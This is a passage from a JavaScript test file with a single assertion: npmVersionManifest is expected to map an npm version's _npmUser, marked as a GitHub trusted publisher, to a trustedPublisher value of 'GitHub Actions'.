  assert.deepEqual(npmVersionManifest({ _npmUser: { name: 'GitHub Actions', trustedPublisher: { id: 'github' } } }), { trustedPublisher: 'GitHub Actions' })
})
